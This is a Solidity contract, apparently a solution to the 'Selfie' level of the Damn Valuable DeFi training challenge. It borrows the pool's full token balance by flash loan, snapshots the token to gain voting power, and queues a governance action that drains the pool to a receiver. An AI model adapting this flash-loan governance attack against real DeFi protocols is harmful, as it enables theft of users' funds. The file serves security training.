import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";

import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit is IERC3156FlashBorrower {
    SelfiePool pool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    uint256 exploitActionId;

    constructor(
        SelfiePool _pool,
        ISimpleGovernance _governance,
        DamnValuableTokenSnapshot _token
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();

        bytes memory data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            address(this)
        );

        exploitActionId = governance.queueAction(address(pool), 0, data);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function queueActionExploit() external {
        // Allow the contract to return the funds after the flashloan
        token.approve(address(pool), type(uint256).max);

        pool.flashLoan(
            this,
            address(token),
            token.balanceOf(address(pool)),
            ""
        );

        // Reset approval for safety
        token.approve(address(pool), 0);
    }

    function executeActionExploit(address _receiver) external {
        governance.executeAction(exploitActionId);

        token.transfer(_receiver, token.balanceOf(address(this)));
    }
}
